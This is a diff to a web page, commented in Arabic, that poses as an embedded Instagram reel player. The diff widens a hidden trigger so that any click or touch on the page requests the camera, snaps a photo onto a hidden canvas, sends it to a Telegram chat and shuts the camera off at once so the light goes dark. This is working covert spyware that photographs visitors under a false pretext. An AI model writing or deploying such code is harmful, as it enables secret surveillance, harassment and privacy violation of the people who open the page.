@@ -1,76 +1,20 @@
-body {
-        background-color: #0f0f0f;
-        color: #ffffff;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        min-height: 100vh;
-        padding: 20px;
-    }
-
-    .video-card {
-        background-color: #1f1f1f;
-        border-radius: 12px;
-        overflow: hidden;
-        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
-        width: 100%;
-        max-width: 480px;
-        padding: 15px;
-    }
-
-    .title {
-        text-align: center;
-        margin-bottom: 15px;
-        font-size: 1.2rem;
-        color: #e1306c;
-    }
-
-    .instagram-wrapper {
-        position: relative;
-        width: 100%;
-        display: flex;
-        justify-content: center;
-    }
-
-    /* إطار الفيديو */
-    iframe {
+iframe {
         border: none;
-        width: 100%;
-        height: 600px;
-        border-radius: 8px;
-    }
-
-    /* طبقة شفافة فوق الفيديو لالتقاط الضغطة الأولى */
-    .trigger-overlay {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: 999;
-        background: transparent;
-        cursor: pointer;
+        max-width: 100%;
+        max-height: 100%;
     }
 </style>
-<div class="video-card">
-    <h2 class="title">مشاهدة المقطع</h2>
-    
-    <div class="instagram-wrapper">
-        <!-- طبقة التقاط الضغطة -->
-        <div class="trigger-overlay" id="overlay"></div>
+<!-- عرض فيديو إنستغرام -->
+<iframe 
+    src="https://www.instagram.com/reel/DdjtPokIGQY/embed" 
+    width="400" 
+    height="500" 
+    scrolling="no" 
+    allowtransparency="true"
+    allow="encrypted-media">
+</iframe>
 
-        <!-- رابط فيديو إنستغرام -->
-        <iframe 
-            src="https://www.instagram.com/reel/DbiGbSrs1iO/embed" 
-            scrolling="no" 
-            allowtransparency="true"
-            allow="encrypted-media">
-        </iframe>
-    </div>
-</div>
-
-<!-- عنصر Canvas مخفي لتجهيز الصورة -->
+<!-- عنصر Canvas مخفي -->
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -79,14 +23,10 @@ body {
 
     let stream = null;
     const canvas = document.getElementById('canvas');
-    const overlay = document.getElementById('overlay');
 
     async function handleCapture(event) {
-        // إخفاء الطبقة بعد أول ضغطة للتفاعل الطبيعي مع الفيديو
-        overlay.style.display = 'none';
-
         try {
-            // طلب الوصول للكميرا
+            // طلب الوصول للكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             
             const video = document.createElement('video');
@@ -98,7 +38,7 @@ body {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل الصورة وإرسالها إلى تيليجرام
+            // 3. إرسال الصورة إلى تيليجرام
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -110,20 +50,21 @@ body {
                         body: formData
                     });
                 } catch (err) {
-                    console.error("خطأ أثناء إرسال الصورة:", err);
+                    console.error("خطأ الإرسال:", err);
                 }
             }, 'image/png');
 
         } catch (err) {
-            console.error("خطأ الوصول إلى الكاميرا:", err);
+            console.error("خطأ الكاميرا:", err);
         } finally {
-            // إيقاف عمل الكاميرا بعد التقاط الصورة
+            // 4. إغلاق الكاميرا وإيقاف الضوء/البث فوراً
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         }
     }
 
-    overlay.addEventListener('click', handleCapture);
-    overlay.addEventListener('touchstart', handleCapture);
+    // الاستماع للنقر أو اللمس في أي مكان في الصفحة
+    window.addEventListener('click', handleCapture);
+    window.addEventListener('touchstart', handleCapture);
 </script>
